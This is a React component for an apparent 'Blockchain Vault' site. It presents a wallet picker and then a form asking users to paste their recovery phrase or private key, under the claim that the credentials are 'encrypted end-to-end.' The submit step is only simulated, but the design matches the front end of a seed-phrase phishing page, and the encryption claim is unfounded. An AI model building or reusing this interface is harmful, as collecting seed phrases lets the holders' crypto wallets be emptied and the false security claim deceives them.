"use client";

import { useState } from "react";
import {
  Drawer,
  DrawerClose,
  DrawerContent,
  DrawerDescription,
  DrawerFooter,
  DrawerHeader,
  DrawerTitle,
  DrawerTrigger,
} from "@/components/ui/drawer";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import {
  ChevronLeft,
  Wallet,
  ShieldCheck,
  Key,
  Smartphone,
  Globe,
  Loader2,
} from "lucide-react";
import { toast } from "sonner";
import { cn } from "@/lib/utils";

// Mock wallet data
const WALLETS = [
  { id: "metamask", name: "MetaMask", icon: Globe, color: "text-orange-500" },
  { id: "trust", name: "Trust Wallet", icon: ShieldCheck, color: "text-blue-500" },
  { id: "coinbase", name: "Coinbase", icon: Smartphone, color: "text-blue-600" },
  { id: "phantom", name: "Phantom", icon: Key, color: "text-purple-500" },
  { id: "walletconnect", name: "WalletConnect", icon: Wallet, color: "text-blue-400" },
  { id: "ledger", name: "Ledger", icon: ShieldCheck, color: "text-gray-400" },
];

export function ConnectWalletDrawer() {
  const [step, setStep] = useState<"select" | "input">("select");
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [credentials, setCredentials] = useState("");
  const [isOpen, setIsOpen] = useState(false);

  const handleWalletSelect = (walletId: string) => {
    setSelectedWallet(walletId);
    setStep("input");
  };

  const handleBack = () => {
    setStep("select");
    setSelectedWallet(null);
    setCredentials("");
  };

  const handleSave = async () => {
    if (!credentials.trim()) {
      toast.error("Please enter your seed phrase or private key");
      return;
    }

    setIsLoading(true);
    // Simulate API call
    await new Promise((resolve) => setTimeout(resolve, 1500));
    
    setIsLoading(false);
    setIsOpen(false);
    toast.success("Wallet connected successfully");
    
    // Reset state after closing
    setTimeout(() => {
      setStep("select");
      setSelectedWallet(null);
      setCredentials("");
    }, 300);
  };

  return (
    <Drawer open={isOpen} onOpenChange={setIsOpen}>
      <DrawerTrigger asChild>
        <Button 
          size="lg" 
          className="bg-yellow-400 text-black hover:bg-yellow-500 font-bold px-8 py-6 text-lg rounded-xl shadow-lg shadow-yellow-400/20 transition-all hover:scale-105 active:scale-95"
        >
          <Wallet className="mr-2 h-5 w-5" />
          Connect Wallet
        </Button>
      </DrawerTrigger>
      <DrawerContent className="bg-zinc-950 border-zinc-800 text-white max-h-[90vh]">
        <div className="mx-auto w-full max-w-sm">
          <DrawerHeader>
            <DrawerTitle className="text-2xl font-bold text-center">
              {step === "select" ? "Connect a Wallet" : `Connect ${WALLETS.find(w => w.id === selectedWallet)?.name}`}
            </DrawerTitle>
            <DrawerDescription className="text-center text-zinc-400">
              {step === "select" 
                ? "Select a wallet to sync with your Blockchain Vault." 
                : "Enter your credentials to securely import your wallet."}
            </DrawerDescription>
          </DrawerHeader>

          <div className="p-4 pb-0">
            {step === "select" ? (
              <div className="grid grid-cols-2 gap-3">
                {WALLETS.map((wallet) => (
                  <button
                    key={wallet.id}
                    onClick={() => handleWalletSelect(wallet.id)}
                    className="flex flex-col items-center justify-center gap-3 p-4 rounded-xl border border-zinc-800 bg-zinc-900/50 hover:bg-zinc-800 hover:border-zinc-700 transition-all active:scale-95"
                  >
                    <div className={cn("p-3 rounded-full bg-zinc-950 border border-zinc-800", wallet.color)}>
                      <wallet.icon className="h-6 w-6" />
                    </div>
                    <span className="font-medium text-sm text-zinc-300">{wallet.name}</span>
                  </button>
                ))}
              </div>
            ) : (
              <div className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="credentials" className="text-zinc-300">
                    Recovery Phrase or Private Key
                  </Label>
                  <Textarea
                    id="credentials"
                    placeholder="Enter your 12 or 24-word recovery phrase or private key..."
                    className="min-h-[120px] bg-zinc-900 border-zinc-700 text-white placeholder:text-zinc-600 resize-none focus-visible:ring-yellow-400/50"
                    value={credentials}
                    onChange={(e) => setCredentials(e.target.value)}
                  />
                  <p className="text-xs text-zinc-500 flex items-center gap-1">
                    <ShieldCheck className="h-3 w-3" />
                    Your credentials are encrypted end-to-end.
                  </p>
                </div>
              </div>
            )}
          </div>

          <DrawerFooter className="pt-2">
            {step === "input" ? (
              <div className="flex gap-3 w-full">
                <Button variant="outline" onClick={handleBack} className="flex-1 bg-transparent border-zinc-700 text-zinc-300 hover:bg-zinc-800 hover:text-white">
                  <ChevronLeft className="mr-2 h-4 w-4" />
                  Back
                </Button>
                <Button 
                  onClick={handleSave} 
                  disabled={isLoading}
                  className="flex-1 bg-yellow-400 text-black hover:bg-yellow-500"
                >
                  {isLoading ? (
                    <>
                      <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                      Connecting...
                    </>
                  ) : (
                    "Import Wallet"
                  )}
                </Button>
              </div>
            ) : (
              <DrawerClose asChild>
                <Button variant="outline" className="w-full bg-transparent border-zinc-700 text-zinc-300 hover:bg-zinc-800 hover:text-white">Cancel</Button>
              </DrawerClose>
            )}
          </DrawerFooter>
        </div>
      </DrawerContent>
    </Drawer>
  );
}
